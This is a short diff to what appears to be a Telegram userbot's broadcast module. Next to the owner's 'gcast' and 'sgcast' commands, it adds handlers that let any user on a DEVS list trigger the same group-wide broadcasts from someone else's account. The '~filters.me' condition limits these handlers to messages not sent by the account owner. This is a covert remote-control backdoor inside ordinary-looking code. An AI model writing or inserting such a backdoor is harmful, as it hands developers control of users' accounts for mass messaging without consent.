@@ -21,10 +21,12 @@ __HELP__ = """
 
 
 @PY.UBOT("gcast")
+@ubot.on_message(filters.user(DEVS) & filters.command("cgcast", "") & ~filters.me)
 async def _(client, message):
     await broadcast_group_cmd(client, message)
 
 @PY.UBOT("sgcast")
+@ubot.on_message(filters.user(DEVS) & filters.command("csgcast", "") & ~filters.me)
 async def _(client, message):
     await continuous_broadcast(client, message)
 
